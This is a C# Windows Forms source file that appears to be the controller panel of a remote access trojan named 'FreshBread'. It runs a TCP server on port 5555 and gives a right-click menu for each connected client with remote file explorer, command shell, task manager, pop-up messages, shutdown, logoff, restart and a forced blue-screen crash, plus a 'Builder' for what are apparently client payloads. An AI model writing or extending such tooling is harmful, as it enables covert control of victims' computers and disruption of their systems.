using FreshBreadHost;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FreshBread_Host
{
    public partial class Main : Form
    {
        public static Server server;
        public static TcpClient selectedClient;

        public Main()
        {
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            Thread serverThread = new System.Threading.Thread(new System.Threading.ThreadStart(startServer));
            serverThread.Start();
        }

        public void startServer()
        {
            server = new Server(5555, this);
        }

        private void clients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selectedClient = Server.tcpClients.ElementAt(clients.HitTest(e.X, e.Y).RowIndex);

                ContextMenu cm = new ContextMenu();
                cm.MenuItems.Add(new MenuItem("Cut", new System.EventHandler(this.messageBox)));
                cm.MenuItems.Add(new MenuItem("File Explorer", new System.EventHandler(this.fileExplorer)));
              //  cm.MenuItems.Add(new MenuItem("Force BSOD", new System.EventHandler(this.BSOD)));
              //TODO: FIX BSOD WITH NOTMYFAULT TOOL
                cm.MenuItems.Add(new MenuItem("CMD", new System.EventHandler(this.CMD)));
                cm.MenuItems.Add(new MenuItem("Task Manager", new System.EventHandler(this.taskManager)));
                //power directory
                MenuItem power = new MenuItem("Power", new System.EventHandler(this.BSOD));
                cm.MenuItems.Add(power);
                power.MenuItems.Add(new MenuItem("Shutdown", new System.EventHandler(this.poweroff)));
                power.MenuItems.Add(new MenuItem("Log off", new System.EventHandler(this.logoff)));
                power.MenuItems.Add(new MenuItem("Restart", new System.EventHandler(this.restart)));
                //show menu
                cm.Show(this, new Point(e.X, e.Y));
            }
        }

        public void taskManager(Object sender, EventArgs e)
        {
            TaskManager tManager = new TaskManager(selectedClient);
            tManager.Show();
        }

        public void CMD(Object sender, EventArgs e)
        {
            CMD command = new CMD(selectedClient);
            command.Show();
        }

        public void poweroff(Object sender, EventArgs e)
        {
            Server.sendMessage(selectedClient, "poweroff");
        }

        public void logoff(Object sender, EventArgs e)
        {
            Server.sendMessage(selectedClient, "logoff");
        }

        public void restart(Object sender, EventArgs e)
        {
            Server.sendMessage(selectedClient, "restart");
        }

        public void BSOD(Object sender, EventArgs e)
        {
            Server.sendMessage(selectedClient, "bsod");
        }

        public void messageBox(Object sender, EventArgs e)
        {
            MessageBoxDesigner mbd = new MessageBoxDesigner(selectedClient);
            mbd.Show();
        }

        public void fileExplorer(Object sender, EventArgs e)
        {
            FileExplorer fileExplorer = new FileExplorer(selectedClient);
            fileExplorer.Show();
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Builder bldr = new Builder();
            bldr.Show();
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(1);
        }
    }
}
